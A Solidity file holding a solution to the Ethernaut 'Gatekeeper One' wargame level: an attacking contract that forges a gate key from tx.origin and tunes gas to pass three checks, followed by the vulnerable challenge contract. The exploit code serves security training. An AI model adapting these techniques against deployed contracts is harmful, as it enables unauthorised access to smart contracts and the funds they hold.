// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 13. GATE KEEPER ONE
 * @dev Make it past the gatekeeper and register as an entrant to pass this level.
 */

contract Ethernaut_GateKeeperOne {
    address private gateKeeper = 0x3D47f75FdB928E3DC0206DC0Dc3470fF79A43fE2; // Replace with your GatekeeperOne instance

    function constructGateKey() public view returns (bytes8 gateKey) {
        // Extract the least significant 16 bits from tx.origin
        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
        // Construct the gateKey with the following structure: [non-zero bytes][00..00][ls16BitsTxOrigin]
        // Ensure the most significant 32 bits are not all zeros to satisfy the second requirement
        // Here, '0x0001' is an arbitrary non-zero value to ensure the most significant 32 bits are not all zeros
        gateKey = bytes8(
            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
        );
        return gateKey;
    }

    // Pass Gate 1: require(msg.sender != tx.origin);
    function attack(uint256 gas) external {
        bytes8 key = constructGateKey();

        // Pass Gate 2: require(gasleft() % 8191 == 0);
        require(gas < 8191, "gas > 8191");

        (bool success, ) = gateKeeper.call{gas: 8191 * 20 + gas}( // gas == 256
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Attack failed");
    }

    function tryFirstCheck(
        bytes8 _gateKey
    ) public pure returns (uint32, uint16) {
        return (uint32(uint64(_gateKey)), uint16(uint64(_gateKey))); // ==
    }

    function trySecondCheck(
        bytes8 _gateKey
    ) public pure returns (uint32, uint64) {
        return (uint32(uint64(_gateKey)), uint64(_gateKey)); // !=
    }

    function tryThirdCheck(
        bytes8 _gateKey
    ) public view returns (uint32, uint16) {
        return (uint32(uint64(_gateKey)), uint16(uint160(msg.sender))); // ==
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
